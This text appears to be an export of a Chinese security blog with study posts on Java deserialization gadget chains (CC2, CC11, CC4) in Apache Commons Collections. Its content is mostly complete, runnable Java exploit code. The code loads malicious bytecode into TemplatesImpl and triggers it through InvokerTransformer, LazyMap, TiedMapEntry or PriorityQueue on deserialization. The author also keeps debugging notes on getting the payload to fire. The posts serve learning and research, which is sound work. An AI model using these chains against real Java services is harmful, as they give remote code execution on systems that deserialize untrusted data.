<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-comment">//和CC4一样</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>		<span class="hljs-comment">//构造InvokerTransformer类去调用templates对象的newTransformer()方法</span><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-comment">//创建TransformingComparator类对象，传⼊一个临时的Transformer类对象(ConstantTransformer)，让代码序列化的时候不执行，在反序列化的时候执行。</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <br>        <br>        <span class="hljs-comment">//创建 PriorityQueue类对象传入transformingComparator对象，但是此时向队列⾥添加的元素就是我们前⾯创建的 TemplatesImpl对象了，这是因为最后调用 PriorityQueue.compare() 的时候是传入队列中的两个对象，然后 compare()中调用 Transformer.transform(obj1) 的时候用的是传入的第一个对象作为参数，因此这里需要将priorityQueue队列中的第一个对象设置为构造好的 templates 对象。</span><br>        <span class="hljs-comment">//PriorityQueue调用TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602022510898.png" alt="image-20240602022510898"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
<p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">Java反序列化Commons-Collections篇05-CC2链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC11</title>
    <url>/2024/06/05/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC11/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前在学习CC2的时候，CC2是CC3+CC4改写的。</p>
<p>从图中就可以看出来，CC6也能走到TemplatesImpl，然后直接加载字节码。</p>
<p>CC2+CC6改写，就是CC11</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p>
<h2 id="CC11利用链"><a href="#CC11利用链" class="headerlink" title="CC11利用链"></a>CC11利用链</h2><p>之前在<a href="https://sp4rks3.github.io/2024/05/27/JAVA%E5%AE%89%E5%85%A8/CC3/">Java反序列化CommonsCollections篇-CC3</a>中提到利用<code>ClassLoader#defineClass</code>直接加载字节码的方式，在这里可以直接使用。</p>
<p>其实这样的话，直接使用CC2加载恶意字节码的部分结合CC6前面调用的部分就可以组成这条链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>		<br>        <br>        <span class="hljs-comment">//TemplatesImpl加载恶意字节码</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>		<span class="hljs-comment">//templates.newTransformer();</span><br>		<br>        <span class="hljs-comment">//通过ChainedTransformer加载templates的newTransformer方法</span><br>        <span class="hljs-comment">//CC6</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>		lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这条链最终也是可以改写成不带 Transformer 数组的链。</p>
<h2 id="最终成型的CC11"><a href="#最终成型的CC11" class="headerlink" title="最终成型的CC11"></a>最终成型的CC11</h2><p>这个 <code>LazyMap#get</code> 的参数 key，会被传进<code>transform()</code>，实际上它可以扮演 ConstantTransformer 的角色——一个简单的对象传递者。</p>
<p>我们 <code>LazyMap.get(key)</code> 直接调用 <code>InvokerTransfomer.transform(key)</code>，然后像CC2那样调用 <code>TempalteImpl.newTransformer()</code> 来完成后续调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//TemplatesImpl加载恶意字节码</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br>		<br>		<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, templates);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);  <span class="hljs-comment">//注意这里有坑</span><br><br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(lazymap, invokerTransformer);<br><br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><p>当时运行这段代码，可以运行，也没报错，但是计算机并不能弹出来，大体浏览了一边代码感觉没问题。当时卡在这里好久，只能慢慢调试。</p>
<p>直接在<code>TemplatesImpl</code>加载恶意字节码的部分尝试<code>templates.newTransformer()</code>，首先确定了<code>TemplatesImpl</code>加载恶意字节码是能够触发的，那这部分没有问题</p>
<p><code>InvokerTransformer</code>调用的部分我想应该没有问题，那最有可能有问题的其实是<code>Lazymap</code>，看了最上面的图，看到是调用了LazyMap.get()，直接下断点调试</p>
<p>其实和之前CC6的情况是一样的，当LazyMap没key的时候才会调用<code>put()</code>，但是现在的key为<code>templates</code>，结果为<code>map.containsKey(key) == true</code>导致条件判断失败。</p>
<p>解决办法也很简单直接<code>lazymap.clear();</code>或者<code>lazymap.remove(&quot;templates&quot;);</code></p>
<p>(粗心大意导致浪费了很多时间)。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240605205214090.png" alt="image-20240605205214090"></p>
<h3 id="最终链子"><a href="#最终链子" class="headerlink" title="最终链子"></a>最终链子</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//TemplatesImpl加载恶意字节码</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, templates);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(templates);<br>        <br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(lazymap, invokerTransformer);<br>        <br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/dota-st/JavaSec/blob/master/03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/9-CommonsCollections11/CommonsCollections11.md">CommonsCollections11利用链分析</a></p>
<p><a href="https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/#5-%E6%9C%80%E7%BB%88%E4%B8%8D%E5%B8%A6-Transformer-%E6%95%B0%E7%BB%84%E7%9A%84-CC11-%E9%93%BE%E5%AD%90">Java反序列化Commons-Collections篇09-CC11链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC4</title>
    <url>/2024/06/01/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC4/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面几条链都是CommonsCollections3中产生的反序列化漏洞，后来Apache更新了大版本4.0，也产生了反序列化漏洞。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>JDK8u65</li>
<li>CommonsCollections4</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="CC4调用链分析"><a href="#CC4调用链分析" class="headerlink" title="CC4调用链分析"></a>CC4调用链分析</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC4.png" alt="CC4"></p>
<p>在之前的CC链中，有两种执行代码的方式<code>InvokerTransformer.transform()</code>和<code>InstantiateTransformer.transform()</code>动态加载字节码</p>
<p>因为CommonsCollections4取消了InvokerTransformer 的 Serializable 继承，所以只能通过动态加载字节码的方式反序列化。</p>
<p>所以接下来去找谁调用了<code>transform()</code> 方法</p>
<p>找到了<code>org.apache.commons.collections4.comparators#TransformingComparator.compare()</code>，因为<code>this.transformer</code>可控</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601123801402.png" alt="image-20240601123801402"></p>
<p>接着找谁调用了<code>compare()</code>方法，找到了 <code>PriorityQueue.readObject().siftDownUsingComparator()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601123947569.png" alt="image-20240601123947569"></p>
<p><code>PriorityQueue.readObject()</code>中方法调用</p>
<p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p>
<p>整条调用链条，其实相当于入口类变了，新加了一个类，执行代码的部分和CC3是一样的</p>
<h2 id="CC4编写"><a href="#CC4编写" class="headerlink" title="CC4编写"></a>CC4编写</h2><p>执行代码的地方和CC3是一样的</p>
